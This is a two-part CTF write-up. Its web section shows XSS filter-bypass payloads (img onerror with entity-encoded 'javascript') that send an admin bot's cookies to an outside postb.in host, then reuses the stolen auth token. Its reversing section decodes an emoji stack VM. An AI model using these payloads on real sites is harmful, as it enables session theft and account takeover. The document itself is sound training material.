Cookie World Order (**web**)

    Good job! You found a further credential that looks like a VPN 
    referred to as the cWo. The organization appears very clandestine 
    and mysterious and reminds you of the secret ruling class of hard 
    shelled turtle-like creatures of Xenon. Funny they trust their 
    security to a contractor outside their systems, especially one with 
    such bad habits. Upon further snooping you find a video feed of 
    those "Cauliflowers" which look to be the dominant lifeforms and 
    members of the cWo. Go forth and attain greater access to reach 
    this creature!

Similarly with day 3 web problem case, we have a URL: https://cwo-xss.web.ctfcompetition.com/

Opening it and observing very similar page with Admin and field for 
input some text message.

Trying to copy-paste previous solution:

    <script>
    var img=new Image();
    img.src="https://postb.in/1561479835927-8693528019357?cookie="+document.cookie;
    </script>

leads to reply "HACKER ALERT!".
After typing different string it comes out that input must not contain 
`script` or `alert` as a substring. Well, modern WEB is full of tricks 
and wistles. If you (like me) have no expirience with web programming, 
Googling can conpensate it. Just request something like "bypassing XSS 
filter".

Our first:

    <scrip&#0000116>
    aler&#0000116('XSS');
    </scrip&#0000116>

Unfortunately, server removed `<script>` tag. Hm, maybe there are tags 
that are "allowed", do check:
    
    <b> bold </b> 
    <a href="google.com"> google </a> 
    <img src="https://cwo-xss.web.ctfcompetition.com/static/img/profile.png">

Yes, links and images work well! But links mostly requires user's 
actions, and we can be sure, that Admin bot will not click on any.
Now, back to the googling. And quickly find out that it is quite easy 
to call javascript from some event handlers, and if we can fire these 
events, then we can execute script. Common place is `onerror` event of 
`img` node, and it is very easy to fire error, just by giving it 
inproper source URL. Let's use our PostBin and try:

    <img src=x onerror="javascrip&#0000116:
    var img=new Image();
    img.src='https://postb.in/1561495195584-1681611498352?cookie='+document.cookie;">

... and back to PostBin:

    GET /1561495195584-1681611498352 2019-06-25T20:40:15.156Z
    Headers

        x-real-ip: 104.155.55.51
        host: postb.in
        connection: close
        pragma: no-cache
        cache-control: no-cache
        sec-fetch-mode: no-cors
        user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
        accept: image/webp,image/apng,image/*,*/*;q=0.8
        sec-fetch-site: cross-site
        referer: https://cwo-xss.web.ctfcompetition.com/exploit?reflect=%3Cimg%20src=x%20onerror=%22javascrip&
        accept-encoding: gzip, deflate, br

    Query

        cookie: flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz

    Body

But what could we see in Admin panel with his auth token? Open 
WenConsole, do

    document.cookie="auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz"

and click on "Admin" link. What we have here... Users and Livestreams 
seems are not working. Camera Controls say requests are allowed only 
from 127.0.0.1 (localhost). Maybe those HeadlessChrome-bot is on the 
same host with server? Let's try to see how bot renders this page:

    <img src=x onerror="javascrip&#0000116:
    fetch('/admin/controls', {method: 'get'}).then((res) => { return res.text(); }).then((data) => {
          var img=new Image();img.src='https://postb.in/1561495316858-4828648881521?'+data;
    });">

Bad luck, he see the same message:

    GET /1561495316858-4828648881521 2019-06-25T21:03:13.407Z
    Headers

        x-real-ip: 104.155.55.51
        host: postb.in
        connection: close
        pragma: no-cache
        cache-control: no-cache
        sec-fetch-mode: no-cors
        user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36
        accept: image/webp,image/apng,image/*,*/*;q=0.8
        sec-fetch-site: cross-site
        referer: https://cwo-xss.web.ctfcompetition.com/exploit?reflect=%3Cimg%20src=x%20onerror=%22javascrip&
        accept-encoding: gzip, deflate, br

    Query

        Requests only accepted from 127.0.0.1: 

Ok, the flag is

**CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}**


FriendSpaceBookPlusAllAccessRedPremium (**reversing**)


    Having snooped around like the expert spy you were never trained to 
    be, you found something that takes your interest: 
    "Cookie/www.FriendSpaceBookPlusAllAccessRedPremium.com"  But 
    unbeknownst to you, it was only the  700nm Wavelength herring 
    rather than a delicious cookie that you could have found.   It 
    looks exactly like a credential for another system.  You find 
    yourself in search of a friendly book to read.

    Having already spent some time trying to find a way to gain more 
    intelligence... and learn about those fluffy creatures, you 
    (several)-momentarily divert your attention here.  It's a place of 
    all the individuals in the world sharing large amounts of data with 
    one another. Strangely enough, all of the inhabitants seem to speak 
    using this weird pictorial language. And there is hot disagreement 
    over what the meaning of an eggplant is.

    But not much Cauliflower here.  They must be very private 
    creatures.  SarahH has left open some proprietary tools, surely 
    running this will take you to them.  Decipher this language and 
    move forth!

Unzip attachment, see virtual machine interpretator `vm.py` and some 
strange code in `program`. Quite obvious, `program` has code for 
execution by virtual machine, let's try it:

    $ python3 vm.py program
    Running ....
    http://emoji-t^CTraceback (most recent call last):
      File "vm.py", line 180, in <module>
        vm.step()
      File "vm.py", line 25, in step
        fn(self)
      File "vm.py", line 65, in jump_to
        self.instruction_pointer = self.rom.index(marker) + 1
    KeyboardInterrupt

Ok, it is trying to output some URL, but doing it progressively slow.
We need to understand internal logic of both virtual machine and the 
program, then somehow guess what output should it have or speed-up it's 
execution.

Comment in the `vm.py` directly say that it's simple stack-based 
machine, and the list `VM.OPERATIONS` looks quite self-explaining, i.e.:

  - this is stack-machine for sure, very similar to Forth, for example 
  binary operators like `add`, `xor` etc. takes top 2 elements of the 
  stack and put the result on their place (on top)
  - there are two accumulators, that acts like registers for temporary 
  store integer values
  - there is block of memory called `rom` which contains program 
  instructions, which are can be either operations with their operands, 
  or static data (integer numbers), or labels (symbols).

Additionaly we can realize the following facts:

  - `if marker[0] != '💰':` - this marker is prefix of references to 
  some labels, i.e. positions in source code (address in `rom`)
  - `marker = '🖋' + marker[1:]` - this marker is prefix of labels 
  itself
  - `while self.rom[self.instruction_pointer] != '😐':` - this is sort 
  of `endif` statement: VM executes code after `if_zero` and 
  `if_not_zero` until see this instruction or some `jump` instruction
  - `if self.rom[self.instruction_pointer] == '🥇':` - it is 
  designtation of accumulator 1
  - `elif self.rom[self.instruction_pointer] == '🥈':` - it is 
  designation of accumulator 2
  - `while self.rom[self.instruction_pointer] != '✋':` - it is some 
  sort of *end-of-number* symbols, characters before it are 
  interpreted as 10-based digits of a number, and it is used mainly 
  in `load` instruction, which obviously loads some constant to one of 
  two accumulators
  - and each digit if each "numbers" is actually a string that starts 
  with ascii-digit and unicode-trash after it.

First of all, we should try to guess the algorithm by looking on the 
execution process. We can modify VM, for example, by adding to it 
printing the stack, accumulators and instruction pointer to stdout
before printing of each character:

    def print_top(self):
      print((self.accumulator1, self.accumulator2, 
             self.instruction_pointer, self.stack))
      .......
      
And the output is:

    (2, 389, 391, [0, 17488, 16758, 16599, 16285, 16094, 15505, 15417, 14832, 14450, 13893, 13926, 13437, 12833, 12741, 12533, 11504, 11342, 10503, 10550, 10319, 975, 1007, 892, 893, 660, 743, 267, 344, 264, 339, 208, 216, 242, 172, 74, 49, 119, 113, 119, 1, 104])
    h(3, 389, 391, [0, 17488, 16758, 16599, 16285, 16094, 15505, 15417, 14832, 14450, 13893, 13926, 13437, 12833, 12741, 12533, 11504, 11342, 10503, 10550, 10319, 975, 1007, 892, 893, 660, 743, 267, 344, 264, 339, 208, 216, 242, 172, 74, 49, 119, 113, 2, 116])
    t(5, 389, 391, [0, 17488, 16758, 16599, 16285, 16094, 15505, 15417, 14832, 14450, 13893, 13926, 13437, 12833, 12741, 12533, 11504, 11342, 10503, 10550, 10319, 975, 1007, 892, 893, 660, 743, 267, 344, 264, 339, 208, 216, 242, 172, 74, 49, 119, 3, 116])
    t(7, 389, 391, [0, 17488, 16758, 16599, 16285, 16094, 15505, 15417, 14832, 14450, 13893, 13926, 13437, 12833, 12741, 12533, 11504, 11342, 10503, 10550, 10319, 975, 1007, 892, 893, 660, 743, 267, 344, 264, 339, 208, 216, 242, 172, 74, 49, 4, 112])
    p(11, 389, 391, [0, 17488, 16758, 16599, 16285, 16094, 15505, 15417, 14832, 14450, 13893, 13926, 13437, 12833, 12741, 12533, 11504, 11342, 10503, 10550, 10319, 975, 1007, 892, 893, 660, 743, 267, 344, 264, 339, 208, 216, 242, 172, 74, 5, 58])
    .......

The second-to-last value on the stack is obvious iterator, most of the 
stack is constant numbers from program code, and it seems like all 
what program is doing is some "decoding" of this data 
character-by-character, one number for one character. And if it quickly 
slows down to less than 1 character per minute, what could it become 
in the end, where we can see numbers like 101141058?

At the moment `program` and partly `vm.py` are completely 
unreadable. We want to have text code (not byte-code and not 
emoji-code). Simple python script `convert.py` will do conversion for 
us:

    import vm
    import re
    to_replace = [(op, method.__name__) for 
                  (op, method) in vm.VM.OPERATIONS.items()] + [
                  ('💰', 'R'),
                  ('🖋', 'L'),
                  ('😐', 'endif'),
                  ('🥇', 'acc1'),
                  ('🥈', 'acc2'),
                  ('✋', 'EoN')
                 ]
    with open('vm.py', 'r') as f:
        contents = f.read()
    for op, method in to_replace:
        contents = re.sub(op, method, contents)
    with open('new.vm.py', 'w') as f:
        f.write(contents)
    to_replace += [(str(d) + r'\S+', str(d)) for d in range(10)]
    with open('program', 'r') as f:
        contents = f.read()
    for op, method in to_replace:
        contents = re.sub(op, method, contents)
    references = re.findall(r'R\S+', contents)
    for counter, ref in enumerate(references, 1):
        contents = contents.replace(ref, 'R_{}'.format(counter))
        contents = contents.replace('L'+ref[1:], 'L_{}'.format(counter))
    with open('new.program', 'w') as f:
        f.write(contents)


Now `program` looks much better, especially after some formatting:

    load acc1 0 EoN push acc1
    load acc1 1 7 4 8 8 EoN push acc1
    ...............
    load acc2 1 EoN

    L_2 
        pop acc1 
        push acc2 
        push acc1 
        load acc1 3 8 9 EoN
        push acc1 
        push acc2
        jump_to R_1
        xor 
        print_top
        load acc1 1 EoN 
        push acc1 
        add 
        pop acc2
        if_not_zero 
            jump_to R_2 
        endif

    load acc1 9 8 4 2 6 EoN push acc1
    .................
    load acc2 9 9 EoN

    L_4 
        pop acc1 
        push acc2 
        push acc1 
        load acc1 5 6 8 EoN
        push acc1 
        push acc2
        jump_to R_1
        xor 
        print_top
        load acc1 1 EoN 
        push acc1 
        add 
        pop acc2
        if_not_zero 
            jump_to R_4 
        endif

    load acc1 1 0 1 1 4 1 0 5 8 EoN push acc1
    ...................
    load acc2 7 6 5 EoN

    L_6 
        pop acc1 
        push acc2 
        push acc1 
        load acc1 1 0 2 3 EoN
        push acc1 
        push acc2
        jump_to R_1
        xor 
        print_top
        load acc1 1 EoN 
        push acc1 
        add 
        pop acc2
        if_not_zero 
            jump_to R_6 
        endif
        exit

    L_1
        load acc1 2 EoN 
        push acc1 
    L_11
        jump_to R_7
    L_15 
        if_zero 
            pop_out 
            jump_to R_8 
        endif
        pop_out 
        pop acc1 
        load acc2 1 EoN 
        push acc2 
        sub
        if_zero 
            pop_out 
            pop acc2 
            push acc1 
            push acc2 
            jump_top 
        endif 
        push acc1
    L_8 
        load acc2 1 EoN 
        push acc2 
        add 
        jump_to R_11

    L_7
        clone 
        load acc1 2 EoN 
        push acc1
    L_14 
        sub 
        if_zero 
            pop_out 
            load acc1 1 EoN 
            push acc1
            jump_to R_12 
        endif
        pop_out 
        clone 
        push acc1
        modulo 
        if_zero 
            jump_to R_12 
        endif
        pop_out 
        clone 
        push acc1 
        load acc1 1 EoN
        push acc1 
        add 
        clone 
        pop acc1 
        jump_to R_14

    L_9
        clone 
        clone 
        load acc2 0 EoN 
        push acc2
    L_17 
        load acc1 1 0 EoN 
        push acc1
        multiply 
        pop acc2 
        push acc1 
        modulo
        push acc2 
        add 
        pop acc2 
        pop acc1 
        clone 
        push acc2 
        sub
        if_zero 
            pop_out 
            load acc2 1 EoN 
            push acc2 
            jump_to R_15 
        endif
        pop_out 
        push acc1 
        load acc1 1 0 EoN 
        push acc1 
        divide
        if_zero 
            jump_to R_15 
        endif
        clone 
        push acc2 
        jump_to R_17


Oh, that is something: L_2, L_4 and L_6 are quite identical fragments, 
which most certainly decodes their own blocks of numbers, so the 
structure of `program` probably something like that:

    data1 = {...}
    L2: 
    decode_and_print(data1)
    
    data2 = {...}
    L4:
    decode_and_print(data2)
    
    data3 = {...}
    decode_and_print(data3)
    exit()
    
    foo()
    bar()
    ....

Let's try to decompile hypothethical `decode_and_print()` function:

    load acc2 1 EoN
    L_2                     ; decode_and_print(data, acc2) - data is on the stack
        pop acc1            ; from this point it is clear that acc1 can't be suggested as parameter of decode_and_print() - it's value is overwritten immidiately
        push acc2           ; 
        push acc1           ; basically these two operations places the second parameter of function (acc2) to the 
                            ; second-to-top position of the stack, i.e. stack becomes: 
                            ; [ ... data[2], data[1], acc2, data[0] ]
        load acc1 3 8 9 EoN ; the 'address' of instruction to which called function should jump (return) after finish
        push acc1           ; push return-address
        push acc2           ; now stack becomes [ ... data[2], data[1], acc2, data[0], <ra>, acc2 ]
        jump_to R_1         ; call foo() -> stack is modified somehow
        xor                 ; 
        print_top           ; print (stack[0] ^ stack[1]), and those two elements are poped out to nowhere
        load acc1 1 EoN     ; acc1 := 1 
        push acc1           ; 
        add                 ; top element of the stack is incremented
        pop acc2            ; and placed to acc2
        if_not_zero 
            jump_to R_2     ; repeat all above until zero value will be on the stack
        endif

It can be guessed that most probably `foo()` calculates some "key" 
derived from `acc2` value (which is on top of stack at the time of 
calling) and places this key on top instead of `acc2`, then this key 
`xor`ed with data[0], then `acc2` is incremented and these steps 
are repeated until the zero is observed on top of the stack. Notice 
that zero value is placed on the stack with first two instructions 
of `program`: `load acc1 0 EoN push acc1`. It is some sort of "guard", 
signature of "the end of data", like NULL-termination character in 
C-strings.
In C-like pseudocode we can write down:

    void decode_and_print(int *data, int n) {
        if (!(*data))
            return;
        putchar((*data) ^ get_key(n));
        decode_and_print(data++, n++);
    }

It can be more understandable in form of loop instead of recursion:

    void decode_and_print(int data[], int n) {
        for (int i = 0; data[i] != 0; i++, n++)
            putchar(data[i] ^ get_key(n));
    }

Now we can rename L_1 from `foo()` to `get_key(i)` and try to decompile 
it, remembering that it's parameter `i` is stored on top of stack (here 
I will rearrange some lines of code so it will become more compact; 
of course after each such modification it must be checked that program 
was not broken):

    L_1
        load acc1 2 EoN     ; some new local variable, <var1> := 2
        push acc1           ; stack: [... <ra>, <i>, <var1> ]
    L_11
        jump_to R_7
    L_7                     ; now it is just dummy jump
        clone               ; stack: [... <ra>, <i>, <var1>, <var1> ]
        load acc1 2 EoN     ; one more local variable, <var2> := 2
        push acc1           ; [... <ra>, <i>, <var1>, <var1>, <var2> ]
    L_14 
        sub                 ; [... <ra>, <i>, <var1>, <var1> - <var2> ]
        if_zero             ; if <var1> == <var2>
            pop_out         ; remove difference from the stack
            load acc1 1 EoN 
            push acc1       ; [... <ra>, <i>, <var1>, 1 ]
            jump_to R_12    ; look L_12 with stack [... <ra>, <i>, <var1>, 1 ]
        endif
        pop_out             ; remove difference from the stack - in any case it is removed
        clone               ; [... <ra>, <i>, <var1>, <var1> ]
        push acc1           ; [... <ra>, <i>, <var1>, <var1>, <var2> ]
        modulo              ; [... <ra>, <i>, <var1>, <var1> % <var2> ]
        if_zero             ; if (<var1> % <var2> == 0)
            jump_to R_12    ; look L_12 with stack [... <ra>, <i>, <var1>, 0 ]
        endif
        pop_out             ; remove modulo value from stack
        clone               ; [... <ra>, <i>, <var1>, <var1> ]
        push acc1           ; [... <ra>, <i>, <var1>, <var1>, <var2> ]
        load acc1 1 EoN
        push acc1 
        add                 ; <var2> += 1
        clone               ; [... <ra>, <i>, <var1>, <var1>, <var2>, <var2> ]
        pop acc1            ; [... <ra>, <i>, <var1>, <var1>, <var2> ]
        jump_to R_14        ; notice that stack state is the same as just before L_14 label
    L_12 
        if_zero             ; stack case: [... <ra>, <i>, <var1>, 0 ]
            pop_out         ; [... <ra>, <i>, <var1> ]
            jump_to R_8 EoN ; 
        L_8 
            load acc2 1 EoN 
            push acc2 
            add             ; [... <ra>, <i>, <var1> += 1 ]
            jump_to R_11    ; start all over again
        endif
        pop_out             ; [... <ra>, <i>, <var1> ]
        jump_to R_9         ; call bar(i, var1)

This piece is just a little more complicated than previous one.
C-like pseudocode in loop form:

    int get_key(int i) {
        for (int j = 2; ; j++) { // j replaces <var1>
            for (int k = 2; k < j; k++) { // k replaces <var2>
                if (j % k == 0)
                    break;
            }
            if (k == j)
                bar(i, j);
        }
    }

Easy: we do some `bar()` for each j that is a prime number. Probably 
`bar()` can return program not only back to `get_key()`, but also to 
`decode_and_print()` function using `<ra>`, so actually loop is not 
infinite. Now to `bar()` which located on label `L_9`:

    L_9                     ; remember stack is [... <ra>, <i>, <j> ]
        clone
        clone 
        load acc2 0 EoN     ; local <var1> := 0
        push acc2           ; stack [... <ra>, <i>, <j>, <j>, <j>, <var1>]
    L_17 
        load acc1 1 0 EoN 
        push acc1
        multiply            ; <var1> *= 10
        pop acc2            ; acc2 = <var1>
        push acc1           ; stack [... <ra>, <i>, <j>, <j>, <j>, 10 ]
        modulo              ; stack [... <ra>, <i>, <j>, <j>, <j>%10 ]
        push acc2           ; stack [... <ra>, <i>, <j>, <j>, <j>%10, <var1> ]
        add 
        pop acc2            ; acc2 := <var1> + j%10
        pop acc1            ; acc1 := <j>
        clone               ; stack [... <ra>, <i>, <j>, <j> ]
        push acc2           ; stack [... <ra>, <i>, <j>, <j>, <var1> + j%10 ]
        sub                 ; stack [... <ra>, <i>, <j>, <j> - (<var1> + j%10) ]
        if_zero             ; if (j == var1 + j%10 )
            pop_out 
            load acc2 1 EoN 
            push acc2 
            jump_to R_15    ; goto L_15 with stack [... <ra>, <i>, <j>, 1 ]
        endif
        pop_out 
        push acc1           ; stack [... <ra>, <i>, <j>, <j> ]
        load acc1 1 0 EoN
        push acc1 
        divide              ; stack [... <ra>, <i>, <j>, <j> / 10 ]
        if_zero             ; if (j / 10 == 0)
            jump_to R_15    ; goto L_15 with stack [... <ra>, <i>, <j>, 0 ]
        endif
        clone
        push acc2           ; stack [... <ra>, <i>, <j>, <j> / 10, <j> / 10, <var1> + j%10 ]
        jump_to R_17
    L_15                    ; stack here is [... <ra>, <i>, <j>, 0 or 1 ]
        if_zero 
            pop_out 
            jump_to R_8     ; stack [... <ra>, <i>, <j> ]
        endif
        pop_out             
        pop acc1            ; stack [... <ra>, <i> ], acc1 := <j>
        load acc2 1 EoN 
        push acc2 
        sub                 ; <i> -= 1
        if_zero             ; if (<i> == 0)
            pop_out         ; stack [... data[2], data[1], <i>, data[0], <ra> ]
            pop acc2        ; stack [... data[2], data[1], <i>, data[0] ], acc2 := <ra>
            push acc1       
            push acc2       ; stack [... data[2], data[1], <i>, data[0], <j> ]
            jump_top        ; return from get_key()
        endif 
        push acc1           
    L_8                     ; stack [... <ra>, <i>, <j> ]
        load acc2 1 EoN 
        push acc2 
        add                 ; <j> += 1
        jump_to R_11        ; it is returning to the main loop of get_key()


Ok, it is solvable. `bar()` is some sort of check. So:

    int check(i, j) {
        for (int k = 0, l = j; ; ) { // k replaces <var1>
            k = 10*k + l%10;
            l /= 10;
            if (j == k) {
                i--;
                if (i == 0)
                    return j; // returning to decode_and_print(), j is the key
            }
            if (l == 0)
                return 0; // returning to get_key()
        }
    }

This is not so obvious, but nevertheless it can be seen that expression 
`k = 10*k + l%10` adds the right-most (least significant) digit of `l` 
to the right of `k`, shifting all other digits of `k` to the left, and 
as the starting value of `l` is `j`, hence at last iteration when `l` 
becomes zero, `k` becomes reversed `j`.
We can conclude that this `check()` is successfull if and only if `j` 
is palindromic number, because until `l` actually become zero, `k` will 
have even different number of digits comparing to `j` and can't they 
can't be equal.
And one more detail: `i` is the index of key in sequence of such 
numbers.

Now, all pieces together:

    void decode_and_print(int data[], int n) {
        for (int i = 0; data[i] != 0; i++) {
            int key = nth_palindromic_prime(n + i);
            putchar(data[i] ^ key);
        }
    }


Not very hard, isn't it?
We should just write this in some proper language with slightly more 
efficient algorithm than bruteforce. Numbers are quite small, so it 
should be enough to make deterministic primality test. The biggest 
number has 9 digits, so it is enough to precalculate all primes up to
5 digits long and use them:

    N = 10000
    sieve = [True] * N
    for i in range(3,int(N**0.5)+1,2):
        if sieve[i]:
            sieve[i*i::2*i]=[False]*int((N-i*i-1)/(2*i)+1)
    primes = [2] + [i for i in range(3,N,2) if sieve[i]]

    def is_prime(n):
        limit = int(n**0.5)
        for p in primes:
            if p > limit:
                break
            if n % p == 0:
                return False
        return True


And we better not to test palindromity, but just generate all needed 
values of sequence. 

    def gen_keys(upto):
        ret = [2, 3, 5, 7, 11]
        l = len(str(upto)) // 2
        for part in range(1, 10**l):
            left = str(part)
            right = left[::-1]
            for m in range(10):
                n = int(left + str(m) + right)
                if is_prime(n):
                    ret.append(n)
        return ret

    keys = gen_keys(10000000)


I'm too lazy to type numbers by hand, so here is parser as simple as 
ugly:

    data = []
    with open('new.program', 'r') as f:
        temp = []
        for line in f.readlines():
            if line.startswith('load acc1') and line.strip().endswith('push acc1'):
                num = int(line[9:line.find('EoN')].replace(' ', ''))
                if num != 0:
                    temp.append(num)
            elif line.startswith('load acc2'):
                base = int(line[9:line.find('EoN')].replace(' ', ''))
                for i, num in enumerate(reversed(temp)):
                    data.append((base + i, num))
                temp = []

And finally! Decoding!

    for i, char in data:
        print(chr(char ^ keys[i-1]), end='')
    print("")

Run it:

    $ python3 solve.py 
    http://emoji-t0anaxnr3nacpt4na.web.ctfcompetition.com/humans_and_cauliflowers_network/

Go to this link and found several pages with photos, one of which 
contains the flag.

In my opinion, this problem is the best one of all Beginner's Quest.

**CTF{Peace_from_Cauli!}**
